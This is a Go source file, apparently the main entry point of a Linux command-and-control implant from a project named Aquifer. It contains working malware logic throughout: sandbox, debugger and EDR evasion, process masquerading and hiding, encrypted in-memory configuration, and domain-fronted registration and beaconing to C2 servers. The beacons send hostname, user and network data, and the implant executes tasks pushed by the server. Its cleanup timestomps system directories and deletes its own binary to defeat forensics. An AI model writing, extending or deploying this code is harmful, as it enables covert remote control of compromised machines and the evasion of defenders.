package main

import (
	"bytes"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"sync"
	"syscall"
	"time"

	"github.com/Real-Fruit-Snacks/Aquifer/internal/shared"
	"github.com/Real-Fruit-Snacks/Aquifer/pkg/c2"
	"github.com/Real-Fruit-Snacks/Aquifer/pkg/config"
	"github.com/Real-Fruit-Snacks/Aquifer/pkg/evasion"
	"github.com/Real-Fruit-Snacks/Aquifer/pkg/namespace"
	"github.com/Real-Fruit-Snacks/Aquifer/pkg/opsec"
	"github.com/Real-Fruit-Snacks/Aquifer/pkg/tasking"
)

var (
	cleanupOnce       sync.Once
	sessionKeyToShred *opsec.EncryptedBlob
	sessionKeyMu      sync.Mutex
)

func main() {
	cfg := config.DefaultConfig()

	if !namespace.IsInNamespace() {
		// Parent stage: pre-namespace evasion and opsec hardening.
		parentStage(cfg)
	} else {
		// Child stage: operating inside namespace isolation.
		childStage(cfg)
	}
}

// parentStage runs evasion checks, hardens the process, then re-executes
// into a new namespace set via Bootstrap. Bootstrap handles the fork/wait
// so this function does not return on success.
func parentStage(cfg *config.ImplantConfig) {
	// Target-keying guardrails: silently exit if not on intended target.
	opsec.EnforceGuardrails(opsec.GuardrailConfigFromImplant(cfg))

	// Environment fingerprinting: detect VM, sandbox, debugger.
	envInfo := evasion.RunFingerprint()
	if evasion.ShouldAbort(envInfo, cfg) {
		os.Exit(0)
	}

	// EDR detection and behavioral adjustment.
	edrInfo := evasion.DetectEDR()
	adjustForEDR(cfg, edrInfo)

	// Opsec hardening before namespace entry.
	_ = opsec.DisableCoreDumpsEx()
	_ = opsec.AntiPtrace()
	_ = opsec.MasqueradeProcess(cfg.MasqueradeName)

	// Re-exec into namespaces. On success the parent blocks in Wait4
	// and exits with the child's status; this call does not return.
	if err := namespace.Bootstrap(cfg); err != nil {
		os.Exit(0)
	}
}

// childStage is the main operational loop running inside the namespace.
func childStage(cfg *config.ImplantConfig) {
	// Catch panics to prevent uncontrolled crash dumps that could
	// leak decrypted keys via stack traces or core files.
	defer func() {
		if r := recover(); r != nil {
			cleanupFunc(cfg)
		}
	}()

	// Minimize OS thread creation. Default Go runtime spawns ~10 threads
	// which is visible via /proc/PID/status Threads field. Real kernel
	// workers have 1 thread. GOMAXPROCS(1) reduces to ~3-4 threads.
	runtime.GOMAXPROCS(1)

	// Hide process artifacts inside the namespace.
	_ = evasion.HideProcEntry()
	_ = evasion.HideProcess(cfg.MasqueradeName)
	_ = opsec.ProtectMemory()

	// Scrub environment: clear Go's env map and zero the kernel-visible
	// /proc/[pid]/environ memory region so forensic tools see nothing.
	os.Clearenv()
	_ = opsec.ScrubEnvironMemory()

	// Wrap sensitive config fields in encrypted blobs. After this call,
	// cfg.C2Servers, cfg.ServerPubKey, etc. are zeroed — all access goes
	// through protectedCfg which decrypts on demand.
	protectedCfg, err := opsec.NewProtectedConfig(cfg)
	if err != nil {
		// Cannot protect config; clean up and exit.
		cleanupFunc(cfg)
		return
	}

	// Wire up signal-driven graceful shutdown.
	shutdownCh := make(chan struct{})
	var shutdownOnce sync.Once
	triggerShutdown := func() {
		shutdownOnce.Do(func() { close(shutdownCh) })
	}

	// Start kill switch with cleanup callback.
	ks := opsec.NewKillSwitch(cfg, func() {
		cleanupFunc(cfg)
	})
	ks.Start()
	defer ks.Stop()

	// Catch SIGTERM / SIGINT for graceful teardown.
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGINT)
	go func() {
		<-sigCh
		signal.Stop(sigCh)
		triggerShutdown()
	}()

	// Perform ECDH key exchange; without a session key we cannot operate.
	// Decrypt server public key temporarily for ECDH.
	var sessionKey []byte
	var clientPubKey []byte
	var kexErr error
	opsec.WithDecrypted(protectedCfg.ServerPubKey, func(serverPub []byte) {
		sessionKey, clientPubKey, kexErr = c2.PerformKeyExchange(serverPub)
	})
	if kexErr != nil {
		cleanupFunc(cfg)
		return
	}

	// Register with the C2 server by sending our public key once.
	// Decrypt C2 URLs temporarily as []byte for registration; shred after.
	c2Servers := protectedCfg.GetC2ServersBytes()
	registerWithC2Urls(c2Servers, cfg, clientPubKey)
	opsec.ShredServerList(c2Servers)
	c2Servers = nil
	// Shred the ECDH client public key — combined with the server public key
	// and server private key it could recompute the session key.
	opsec.ShredMemory(clientPubKey)
	clientPubKey = nil

	// Decrypt DNS/DoH domains for transport fallback setup.
	// Create separate copies: one for the transport (retained) and
	// one local reference we zero immediately after.
	dnsDomains := make([]string, len(protectedCfg.DNSDomains))
	for i, ps := range protectedCfg.DNSDomains {
		dnsDomains[i] = ps.Get()
	}
	dohResolvers := make([]string, len(protectedCfg.DoHResolvers))
	for i, ps := range protectedCfg.DoHResolvers {
		dohResolvers[i] = ps.Get()
	}
	// Copy slice headers for transport — Go strings are immutable reference
	// types so this shares backing memory, but the transport retains valid
	// references after the local slice is zeroed below.
	transportDNS := make([]string, len(dnsDomains))
	copy(transportDNS, dnsDomains)
	transportDoH := make([]string, len(dohResolvers))
	copy(transportDoH, dohResolvers)
	cfg.DNSDomains = transportDNS
	cfg.DoHResolvers = transportDoH
	// Initialize C2 transport layer using resolver function so URLs stay encrypted at rest.
	// GetC2ServersBytes returns [][]byte that the transport shreds after each Send().
	transport := c2.NewTransportManagerFromResolver(protectedCfg.GetC2ServersBytes, cfg)
	// Zero the local copies (transport retains its own).
	for i := range dnsDomains {
		dnsDomains[i] = ""
	}
	for i := range dohResolvers {
		dohResolvers[i] = ""
	}
	cfg.DNSDomains = nil
	cfg.DoHResolvers = nil

	// Wrap the session key in an encrypted blob so it does not sit in
	// cleartext memory between beacon cycles.
	encSessionKey, err := opsec.NewEncryptedBlob(sessionKey)
	if err != nil {
		// crypto/rand failure is unrecoverable; clean up and exit.
		cleanupFunc(cfg)
		return
	}
	// sessionKey slice has been shredded by NewEncryptedBlob.
	sessionKeyMu.Lock()
	sessionKeyToShred = encSessionKey
	sessionKeyMu.Unlock()

	// Initialize task handler with all built-in task types.
	taskHandler := tasking.NewTaskHandler()
	taskHandler.RegisterDefaults()

	// Enter the beacon loop; it runs until shutdown is signaled.
	beaconLoop(cfg, transport, encSessionKey, protectedCfg, taskHandler, shutdownCh)

	// Close transport connections before cleanup to release TLS state and
	// C2 URL strings from the HTTP client's heap allocations.
	transport.Close()

	// Destroy all protected config blobs so encrypted C2 URLs, keys, and
	// domains don't linger in memory during cleanup or if suspended.
	protectedCfg.Destroy()

	// Orderly teardown after beacon loop exits.
	cleanupFunc(cfg)
}

// registerWithC2Urls posts the client's ECDH public key to each C2 server's
// /api/v1/register endpoint. It tries servers in order and returns after
// the first successful registration. Failure is non-fatal: the implant
// can still beacon; the server will reject unrecognised sessions instead.
// The caller owns the lifetime of `servers` and is responsible for shredding.
func registerWithC2Urls(servers [][]byte, cfg *config.ImplantConfig, clientPubKey []byte) {
	if len(servers) == 0 || len(clientPubKey) == 0 {
		return
	}

	// Build an HTTP client that mirrors the HTTPS transport's TLS profile.
	tlsCfg := c2.RandomizedTLSConfig()
	if cfg.FrontingDomain != "" {
		tlsCfg.ServerName = cfg.FrontingDomain
	}
	httpClient := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig:   tlsCfg,
			Proxy:             http.ProxyFromEnvironment,
			DisableKeepAlives: true,
		},
		Timeout: 20 * time.Second,
	}

	// Use a polymorphic beacon profile for the registration request
	// so it blends with normal beacon traffic fingerprint.
	regBeacon := c2.NewPolymorphicBeacon()

	for _, server := range servers {
		// Convert to string in tight scope for URL parsing.
		serverStr := string(server)
		// Extract scheme://host from the full beacon URL (which includes a path).
		parsed, err := url.Parse(serverStr)
		if err != nil {
			continue
		}
		regURL := parsed.Scheme + "://" + parsed.Host + "/api/v1/register"

		req, err := http.NewRequest(http.MethodPost, regURL, bytes.NewReader(clientPubKey))
		if err != nil {
			continue
		}
		// Apply polymorphic profile to match beacon traffic fingerprint.
		profile := regBeacon.NextProfile()
		req.Header.Set("Content-Type", profile.ContentType)
		req.Header.Set("Accept", profile.Accept)
		req.Header.Set("User-Agent", profile.UserAgent)
		for k, v := range profile.Headers {
			req.Header.Set(k, v)
		}
		req.Header.Set("X-Request-ID", cfg.ImplantID)
		if cfg.FrontingDomain != "" && cfg.FrontingHost != "" {
			c2.ApplyFronting(req, cfg.FrontingDomain, cfg.FrontingHost)
		}

		resp, err := httpClient.Do(req)
		if err != nil {
			continue
		}
		// Drain and discard response body (server's pub key echo/ack).
		_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 65536))
		resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			// Successfully registered; no need to try remaining servers.
			return
		}
	}
}

// beaconLoop sends periodic beacons, processes tasking, and sleeps with jitter.
// It exits when shutdownCh is closed or the server sends a Shutdown directive.
func beaconLoop(
	cfg *config.ImplantConfig,
	transport *c2.TransportManager,
	encSessionKey *opsec.EncryptedBlob,
	protectedCfg *opsec.ProtectedConfig,
	taskHandler *tasking.TaskHandler,
	shutdownCh <-chan struct{},
) {
	var (
		pendingResults        []*config.TaskResult
		consecutiveFails      int
		consecutiveRekeyFails int
		maxConsecutive        = cfg.MaxRetries
		sleepDuration         = cfg.CallbackInterval
		jitter                = cfg.Jitter
		backoffApplied        bool
	)

	if maxConsecutive <= 0 {
		maxConsecutive = 5
	}

	for {
		// Check for shutdown before doing work.
		select {
		case <-shutdownCh:
			return
		default:
		}

		// Build beacon payload.
		beacon := &config.Beacon{
			ImplantID:  cfg.ImplantID,
			Hostname:   shared.GetHostname(),
			Username:   shared.GetUsername(),
			UID:        shared.GetUID(),
			PID:        os.Getpid(),
			OS:         runtime.GOOS,
			Arch:       runtime.GOARCH,
			InNS:       namespace.IsInNamespace(),
			Interfaces: shared.GatherNetInfo(),
			Results:    pendingResults,
		}

		// Encode beacon with session key (decrypt only for the duration of encoding).
		var encoded []byte
		var encodeErr error
		opsec.WithDecrypted(encSessionKey, func(key []byte) {
			encoded, encodeErr = c2.EncodeBeacon(beacon, key)
		})
		if encodeErr != nil {
			// Encoding failure is not recoverable; skip this cycle.
			injectIONoise()
			shared.SleepWithShutdown(sleepDuration, jitter, shutdownCh)
			continue
		}

		// Transmit beacon and receive response.
		respData, err := transport.SendWithFallback(encoded)
		if err != nil {
			consecutiveFails++
			if consecutiveFails >= maxConsecutive && !backoffApplied {
				// Crossed the failure threshold; double sleep once to back off.
				sleepDuration = sleepDuration * 2
				if sleepDuration > 30*time.Minute {
					sleepDuration = 30 * time.Minute
				}
				backoffApplied = true
			}
			injectIONoise()
			shared.SleepWithShutdown(sleepDuration, jitter, shutdownCh)
			continue
		}

		// Successful send: reset failure counter and base sleep.
		consecutiveFails = 0
		backoffApplied = false
		sleepDuration = cfg.CallbackInterval

		// Results were transmitted; clear pending buffer.
		pendingResults = nil

		// Flush idle connections. With DisableKeepAlives:true on HTTPS this
		// is a no-op for the primary transport, but clears state on DoH
		// fallback which uses persistent connections.
		transport.FlushConnections()
		// Hint GC to collect short-lived URL strings created during Send().
		runtime.GC()

		// Decode server response (decrypt only for the duration of decoding).
		var resp *config.BeaconResponse
		var decodeErr error
		opsec.WithDecrypted(encSessionKey, func(key []byte) {
			resp, decodeErr = c2.DecodeResponse(respData, key)
		})
		if decodeErr != nil {
			injectIONoise()
			shared.SleepWithShutdown(sleepDuration, jitter, shutdownCh)
			continue
		}

		// Server-initiated shutdown.
		if resp.Shutdown {
			return
		}

		// Server sleep/jitter overrides (value in seconds / 0.0-1.0).
		if resp.Sleep > 0 {
			sleepDuration = time.Duration(resp.Sleep) * time.Second
		}
		if resp.Jitter > 0 {
			jitter = resp.Jitter
		}

		// Process each task from the server.
		for i := range resp.Tasks {
			result := taskHandler.Handle(resp.Tasks[i])
			result.ImplantID = cfg.ImplantID
			pendingResults = append(pendingResults, result)
		}

		// Rotate the in-memory session key encryption each cycle.
		// Track consecutive failures — entropy exhaustion indicates
		// a compromised or failing system. Only reset when BOTH succeed.
		sessionErr := encSessionKey.Rekey()
		configErr := opsec.RekeyAll(protectedCfg)
		if sessionErr != nil || configErr != nil {
			consecutiveRekeyFails++
		} else {
			consecutiveRekeyFails = 0
		}
		if consecutiveRekeyFails > 3 {
			return
		}

		// Inject I/O noise to break beacon pattern correlation.
		injectIONoise()

		// Sleep with jitter before next beacon.
		shared.SleepWithShutdown(sleepDuration, jitter, shutdownCh)
	}
}

// injectIONoise performs small random reads from common procfs files
// to break I/O pattern correlation in /proc/[pid]/io statistics.
func injectIONoise() {
	noiseFiles := []string{
		"/proc/meminfo",
		"/proc/stat",
		"/proc/loadavg",
		"/proc/uptime",
		"/proc/vmstat",
	}
	// Read 1-3 random unique files to add noise.
	count := 1 + c2.CryptoRandIntn(3)
	// Fisher-Yates partial shuffle to pick 'count' unique files.
	for i := 0; i < count && i < len(noiseFiles); i++ {
		j := i + c2.CryptoRandIntn(len(noiseFiles)-i)
		noiseFiles[i], noiseFiles[j] = noiseFiles[j], noiseFiles[i]
	}
	for i := 0; i < count; i++ {
		data, err := os.ReadFile(noiseFiles[i])
		if err == nil {
			runtime.KeepAlive(data)
		}
	}
}

// cleanupFunc performs orderly teardown: run the cleanup task, timestomp
// common paths, unlink the binary, and exit.
// Wrapped in sync.Once so concurrent callers (signal handler, kill switch)
// cannot race on cleanup.
func cleanupFunc(cfg *config.ImplantConfig) {
	sessionKeyMu.Lock()
	if sessionKeyToShred != nil {
		sessionKeyToShred.Destroy()
		sessionKeyToShred = nil
	}
	sessionKeyMu.Unlock()

	cleanupOnce.Do(func() {
		// Run the built-in cleanup task handler for persistence removal.
		handler := tasking.NewTaskHandler()
		handler.RegisterDefaults()
		cleanupTask := config.Task{
			ID:   "cleanup-final",
			Type: "cleanup",
			Args: map[string]string{
				"scope":   "full",
				"workdir": cfg.MountWorkDir,
			},
		}
		_ = handler.Handle(cleanupTask)

		// Timestomp common paths to reduce forensic footprint.
		refFile := "/bin/ls"
		targets := []string{"/tmp", "/var/tmp", "/dev/shm"}
		for _, t := range targets {
			_ = opsec.Timestomp(t, refFile)
		}

		// Shred the session key if it were held in a buffer; at this point
		// the caller's stack owns it, so best-effort zero via runtime.
		// (In practice the caller should ShredMemory on the key slice.)

		// Delete our own binary from disk.
		_ = evasion.UnlinkSelf()

		os.Exit(0)
	})
}

// adjustForEDR modifies implant configuration based on detected EDR presence.
func adjustForEDR(cfg *config.ImplantConfig, edrInfo *evasion.EDRInfo) {
	if !cfg.EDRAwareness {
		return
	}

	recs := evasion.AdjustBehavior(edrInfo)
	for _, rec := range recs {
		switch rec.Action {
		case "increase_jitter":
			if cfg.Jitter < 0.5 {
				cfg.Jitter = 0.5
			}
		case "increase_interval":
			if cfg.CallbackInterval < 60*time.Second {
				cfg.CallbackInterval = 60 * time.Second
			}
		case "disable_persistence":
			cfg.PersistMethods = nil
		case "minimal_operation":
			cfg.Jitter = 0.8
			if cfg.CallbackInterval < 5*time.Minute {
				cfg.CallbackInterval = 5 * time.Minute
			}
			cfg.PersistMethods = nil
		}
	}
}
